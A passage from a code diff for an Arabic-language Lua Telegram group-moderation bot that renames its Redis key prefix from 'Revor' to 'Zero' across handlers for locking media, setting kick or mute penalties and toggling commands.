-Redis:set(Revor.."Revor:Lock:Photo"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:Photo"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الصور").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_usernamektm') then
 local UserId = Text:match('(%d+)/lock_usernamektm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:User:Name"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:User:Name"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل المعرفات").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_tagsktm') then
 local UserId = Text:match('(%d+)/lock_tagsktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:hashtak"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:hashtak"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التاك").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_fwdktm') then
 local UserId = Text:match('(%d+)/lock_fwdktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:forward"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:forward"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التوجيه").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_audioktm') then
 local UserId = Text:match('(%d+)/lock_audioktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Audio"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:Audio"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الصوت").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_stikearktm') then
 local UserId = Text:match('(%d+)/lock_stikearktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Sticker"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:Sticker"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الملصقات").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_phonektm') then
 local UserId = Text:match('(%d+)/lock_phonektm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Contact"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:Contact"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الجهات").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_videonotektm') then
 local UserId = Text:match('(%d+)/lock_videonotektm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Unsupported"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:Unsupported"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل بصمه الفيديو").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_markdaunktm') then
 local UserId = Text:match('(%d+)/lock_markdaunktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Markdaun"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:Markdaun"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الماركدون").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_gamesktm') then
 local UserId = Text:match('(%d+)/lock_gamesktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:geam"..ChatId,"ktm")  
+Redis:set(Zero .."Zero :Lock:geam"..ChatId,"ktm")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الالعاب").lockKtm, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_floodktm') then
 local UserId = Text:match('(%d+)/lock_floodktm')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:hset(Revor.."Revor:Spam:Group:User"..ChatId ,"Spam:User","mute")  
+Redis:hset(Zero .."Zero :Spam:Group:User"..ChatId ,"Spam:User","mute")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التكرار").lockKtm, 'md', true, false, reply_markup)
 end
@@ -11539,126 +11542,126 @@ end
 if Text and Text:match('(%d+)/lock_linkkick') then
 local UserId = Text:match('(%d+)/lock_linkkick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Link"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Link"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الروابط").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_spamkick') then
 local UserId = Text:match('(%d+)/lock_spamkick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Spam"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Spam"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الكلايش").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_keypordkick') then
 local UserId = Text:match('(%d+)/lock_keypordkick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Keyboard"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Keyboard"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الكيبورد").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_voicekick') then
 local UserId = Text:match('(%d+)/lock_voicekick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:vico"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:vico"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الاغاني").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_gifkick') then
 local UserId = Text:match('(%d+)/lock_gifkick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Animation"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Animation"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل المتحركات").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_fileskick') then
 local UserId = Text:match('(%d+)/lock_fileskick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Document"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Document"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الملفات").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_videokick') then
 local UserId = Text:match('(%d+)/lock_videokick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Video"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Video"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الفيديو").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_photokick') then
 local UserId = Text:match('(%d+)/lock_photokick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Photo"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Photo"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الصور").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_usernamekick') then
 local UserId = Text:match('(%d+)/lock_usernamekick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:User:Name"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:User:Name"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل المعرفات").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_tagskick') then
 local UserId = Text:match('(%d+)/lock_tagskick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:hashtak"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:hashtak"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التاك").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_fwdkick') then
 local UserId = Text:match('(%d+)/lock_fwdkick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:forward"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:forward"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التوجيه").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_audiokick') then
 local UserId = Text:match('(%d+)/lock_audiokick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Audio"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Audio"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الصوت").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_stikearkick') then
 local UserId = Text:match('(%d+)/lock_stikearkick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Sticker"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Sticker"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الملصقات").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_phonekick') then
 local UserId = Text:match('(%d+)/lock_phonekick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Contact"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Contact"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الجهات").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_videonotekick') then
 local UserId = Text:match('(%d+)/lock_videonotekick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Unsupported"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Unsupported"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل بصمه الفيديو").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_markdaunkick') then
 local UserId = Text:match('(%d+)/lock_markdaunkick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:Markdaun"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:Markdaun"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الماركدون").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_gameskick') then
 local UserId = Text:match('(%d+)/lock_gameskick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Lock:geam"..ChatId,"kick")  
+Redis:set(Zero .."Zero :Lock:geam"..ChatId,"kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل الالعاب").lockKick, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/lock_floodkick') then
 local UserId = Text:match('(%d+)/lock_floodkick')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:hset(Revor.."Revor:Spam:Group:User"..ChatId ,"Spam:User","kick")  
+Redis:hset(Zero .."Zero :Spam:Group:User"..ChatId ,"Spam:User","kick")  
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم قفـل التكرار").lockKick, 'md', true, false, reply_markup)
 end
@@ -11666,70 +11669,70 @@ end
 if Text and Text:match('(%d+)/unmute_link') then
 local UserId = Text:match('(%d+)/unmute_link')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Status:Link"..ChatId) 
+Redis:del(Zero .."Zero :Status:Link"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تعطيل امر الرابط").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unmute_welcome') then
 local UserId = Text:match('(%d+)/unmute_welcome')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Status:Welcome"..ChatId) 
+Redis:del(Zero .."Zero :Status:Welcome"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تعطيل امر الترحيب").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unmute_Id') then
 local UserId = Text:match('(%d+)/unmute_Id')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Status:Id"..ChatId) 
+Redis:del(Zero .."Zero :Status:Id"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تعطيل امر الايدي").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unmute_IdPhoto') then
 local UserId = Text:match('(%d+)/unmute_IdPhoto')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Status:IdPhoto"..ChatId) 
+Redis:del(Zero .."Zero :Status:IdPhoto"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تعطيل امر الايدي بالصوره").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unmute_ryple') then
 local UserId = Text:match('(%d+)/unmute_ryple')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Status:Reply"..ChatId) 
+Redis:del(Zero .."Zero :Status:Reply"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تعطيل امر ردود المدير").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unmute_ryplesudo') then
 local UserId = Text:match('(%d+)/unmute_ryplesudo')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Status:ReplySudo"..ChatId) 
+Redis:del(Zero .."Zero :Status:ReplySudo"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تعطيل امر ردود المطور").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unmute_setadmib') then
 local UserId = Text:match('(%d+)/unmute_setadmib')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Status:SetId"..ChatId) 
+Redis:del(Zero .."Zero :Status:SetId"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تعطيل امر الرفع").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unmute_kickmembars') then
 local UserId = Text:match('(%d+)/unmute_kickmembars')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Status:BanId"..ChatId) 
+Redis:del(Zero .."Zero :Status:BanId"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تعطيل امر الطرد - الحظر").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unmute_games') then
 local UserId = Text:match('(%d+)/unmute_games')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Status:Games"..ChatId) 
+Redis:del(Zero .."Zero :Status:Games"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تعطيل امر الالعاب").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/unmute_kickme') then
 local UserId = Text:match('(%d+)/unmute_kickme')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:del(Revor.."Revor:Status:KickMe"..ChatId) 
+Redis:del(Zero .."Zero :Status:KickMe"..ChatId) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تعطيل امر اطردني").unLock, 'md', true, false, reply_markup)
 end
@@ -11737,70 +11740,70 @@ end
 if Text and Text:match('(%d+)/mute_link') then
 local UserId = Text:match('(%d+)/mute_link')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Status:Link"..ChatId,true) 
+Redis:set(Zero .."Zero :Status:Link"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تفعيل امر الرابط").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/mute_welcome') then
 local UserId = Text:match('(%d+)/mute_welcome')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Status:Welcome"..ChatId,true) 
+Redis:set(Zero .."Zero :Status:Welcome"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تفعيل امر الترحيب").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/mute_Id') then
 local UserId = Text:match('(%d+)/mute_Id')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Status:Id"..ChatId,true) 
+Redis:set(Zero .."Zero :Status:Id"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تفعيل امر الايدي").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/mute_IdPhoto') then
 local UserId = Text:match('(%d+)/mute_IdPhoto')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Status:IdPhoto"..ChatId,true) 
+Redis:set(Zero .."Zero :Status:IdPhoto"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تفعيل امر الايدي بالصوره").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/mute_ryple') then
 local UserId = Text:match('(%d+)/mute_ryple')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Status:Reply"..ChatId,true) 
+Redis:set(Zero .."Zero :Status:Reply"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تفعيل امر ردود المدير").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/mute_ryplesudo') then
 local UserId = Text:match('(%d+)/mute_ryplesudo')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Status:ReplySudo"..ChatId,true) 
+Redis:set(Zero .."Zero :Status:ReplySudo"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تفعيل امر ردود المطور").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/mute_setadmib') then
 local UserId = Text:match('(%d+)/mute_setadmib')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Status:SetId"..ChatId,true) 
+Redis:set(Zero .."Zero :Status:SetId"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تفعيل امر الرفع").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/mute_kickmembars') then
 local UserId = Text:match('(%d+)/mute_kickmembars')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Status:BanId"..ChatId,true) 
+Redis:set(Zero .."Zero :Status:BanId"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تفعيل امر الطرد - الحظر").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/mute_games') then
 local UserId = Text:match('(%d+)/mute_games')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Status:Games"..ChatId,true) 
+Redis:set(Zero .."Zero :Status:Games"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تفعيل امر الالعاب").unLock, 'md', true, false, reply_markup)
 end
 elseif Text and Text:match('(%d+)/mute_kickme') then
 local UserId = Text:match('(%d+)/mute_kickme')
 if tonumber(IdUser) == tonumber(UserId) then
-Redis:set(Revor.."Revor:Status:KickMe"..ChatId,true) 
+Redis:set(Zero .."Zero :Status:KickMe"..ChatId,true) 
 local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'listallAddorrem'},},}}
 LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"⌔︙تم تفعيل امر اطردني").unLock, 'md', true, false, reply_markup)
 end
@@ -11815,10 +11818,10 @@ y = 0
 for k, v in pairs(List_Members) do
 if Info_Members.members[k].bot_info == nil then
 if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
-Redis:sadd(Revor.."Revor:TheBasics:Group"..UserId[2],v.member_id.user_id) 
+Redis:sadd(Zero .."Zero :TheBasics:Group"..UserId[2],v.member_id.user_id) 
 x = x + 1
 else
-Redis:sadd(Revor.."Revor:Addictive:Group"..UserId[2],v.member_id.user_id) 
+Redis:sadd(Zero .."Zero :Addictive:Group"..UserId[2],v.member_id.user_id) 
 y = y + 1
 end
 end
@@ -11829,10 +11832,10 @@ end
 if Text and Text:match('(%d+)/LockAllGroup@(.*)') then
 local UserId = {Text:match('(%d+)/LockAllGroup@(.*)')}
 if tonumber(IdUser) == tonumber(UserId[1]) then
-Redis:set(Revor.."Revor:Lock:tagservrbot"..UserId[2],true)   
+Redis:set(Zero .."Zero :Lock:tagservrbot"..UserId[2],true)   
